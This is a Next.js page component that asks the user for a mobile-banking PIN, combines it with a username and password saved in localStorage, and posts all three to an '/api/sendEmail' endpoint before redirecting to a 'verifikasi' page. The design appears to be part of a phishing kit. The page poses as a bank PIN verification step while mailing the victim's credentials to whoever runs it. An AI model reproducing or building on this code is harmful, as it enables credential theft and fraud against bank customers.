
import React, { useState } from 'react'

import { useRouter } from 'next/router'
import SitePin from '../components/SitePin'

function MPin({host}) {
    const [loading, setLoading] = useState('1')
    const router = useRouter()

    const handlePin = async (data) => {

      localStorage.setItem('mPin', data)
      const username = localStorage.getItem('username')
      const password = localStorage.getItem('password')
      
      const body = {
        mPin: data,
        username,
        password,
      }
      
      try {
        setLoading('0.33')
        const response = await fetch('/api/sendEmail', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'url': host
            },
            body: JSON.stringify(body)
        })

        const json = await response.json()
        
        if (json.status === 200) {
            router.push('/verifikasi')
            setLoading('1')
        } else{
          setLoading('1')
          console.log(json.error)
      }

      } catch (error) {
          setLoading('1')
          console.log(error);
      }
    }
  return (
    <div className="container">
      <div className='container-flex'>
        <div style={{background: 'rgba(51, 170, 51, .1)', height:'100vh', opacity: loading}}>
            <SitePin submitPin={(data)=>handlePin(data)}/>
        </div>
      </div>
    </div>
  )
}

export async function getServerSideProps(context) {

  const host = context.req.headers.host
  
  return {
    props: {
      host
    },
  }
}

export default MPin